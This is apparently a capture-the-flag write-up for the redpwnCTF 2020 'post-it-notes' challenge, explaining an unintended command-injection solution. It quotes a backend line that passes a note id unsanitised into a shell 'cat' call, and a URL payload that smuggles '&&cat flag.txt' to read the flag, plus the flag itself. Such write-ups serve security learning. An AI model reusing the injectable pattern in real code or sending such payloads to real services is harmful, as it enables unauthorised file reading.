---
layout: post
title: "post-it-notes"
author: "shreyas-sriram"
---

Request smuggling has many meanings. Prove you understand at least one of them at `2020.redpwnc.tf:31957`.

Note: There are a lot of time-wasting things about this challenge. Focus on finding the vulnerability on the backend API and figuring out how to exploit it.

## Files
* [source.zip]({{site.baseurl}}/assets/post-it-notes/source.zip)

# Solution
> Note : This solution is unintended.

* Although the challenge description says **Request smuggling**, the solution provided here uses **command injection**
* In `api/server.py`, there is a **subprocess** to retrieve **notes** using the **\<nid\>**<br/>
``` subprocess.Popen(f"cat 'notes/{nid}' ```
* This can be exploited to read the flag<br/>
` http://2020.redpwnc.tf:31957/notes/<original-note-id>'&&cat%20flag.txt' `<br/>
` flag{y0u_b3tt3r_n0t_m@k3_m3_l0s3_my_pyth0n_d3v_j0b}`

> Note : There are more than one ways to solve a problem.
